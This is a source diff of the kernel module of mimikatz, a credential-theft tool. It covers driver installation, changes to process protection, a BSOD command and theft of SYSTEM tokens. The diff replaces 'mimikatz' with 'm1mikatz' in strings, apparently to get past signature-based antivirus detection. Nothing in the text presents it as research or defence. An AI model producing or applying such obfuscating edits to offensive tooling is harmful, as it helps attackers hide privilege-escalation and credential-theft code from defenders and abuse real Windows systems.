@@ -6,8 +6,8 @@
 #include "kuhl_m_kernel.h"
 
 const KUHL_K_C kuhl_k_c_kernel[] = {
-	{kuhl_m_kernel_add_mimidrv,			0,									L"+",				L"Install and/or start mimikatz driver (mimidrv)"},
-	{kuhl_m_kernel_remove_mimidrv,		0,									L"-",				L"Remove mimikatz driver (mimidrv)"},
+	{kuhl_m_kernel_add_mimidrv,			0,									L"+",				L"Install and/or start m1mikatz driver (mimidrv)"},
+	{kuhl_m_kernel_remove_mimidrv,		0,									L"-",				L"Remove m1mikatz driver (mimidrv)"},
 	{NULL,								IOCTL_MIMIDRV_PING,					L"ping",			L"Ping the driver"},
 	{NULL,								IOCTL_MIMIDRV_BSOD,					L"bsod",			L"BSOD !"},
 	{NULL,								IOCTL_MIMIDRV_PROCESS_LIST,			L"process",			L"List process"},
@@ -60,10 +60,10 @@ NTSTATUS kuhl_m_kernel_add_mimidrv(int argc, wchar_t * argv[])
 	{
 		if(kull_m_file_isFileExist(absFile))
 			kull_m_service_install(MIMIKATZ_DRIVER, MIMIKATZ L" driver (" MIMIKATZ_DRIVER L")", absFile, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);
-		else PRINT_ERROR_AUTO(L"kull_m_file_isFileExist");
+		else PRINT_ERROR_AUTO_C("kull_m_file_isFileExist");
 		LocalFree(absFile);
 	}
-	else PRINT_ERROR_AUTO(L"kull_m_file_getAbsolutePathOf");
+	else PRINT_ERROR_AUTO_C("kull_m_file_getAbsolutePathOf");
 	return STATUS_SUCCESS;
 }
 
@@ -86,7 +86,7 @@ NTSTATUS kuhl_m_kernel_processProtect(int argc, wchar_t * argv[])
 		{
 			kprintf(L"Process : %s\n", szProcessName);
 			if(!kull_m_process_getProcessIdForName(szProcessName, &protectInfos.processId))
-				PRINT_ERROR_AUTO(L"kull_m_process_getProcessIdForName");
+				PRINT_ERROR_AUTO_C("kull_m_process_getProcessIdForName");
 		}
 		else if(kull_m_string_args_byName(argc, argv, L"pid", &szPid, NULL))
 		{
@@ -141,7 +141,7 @@ NTSTATUS kuhl_m_kernel_processToken(int argc, wchar_t * argv[])
 	if(!tokenInfo.fromProcessId)
 		kprintf(L" * from 0 will take SYSTEM token\n");
 	if(!tokenInfo.toProcessId)
-		kprintf(L" * to 0 will take all \'cmd\' and \'mimikatz\' process\n");
+		kprintf(L" * to 0 will take all \'cmd\' and \'m1mikatz\' process\n");
 
 	kull_m_kernel_mimidrv_simple_output(IOCTL_MIMIDRV_PROCESS_TOKEN, &tokenInfo, sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO));
 
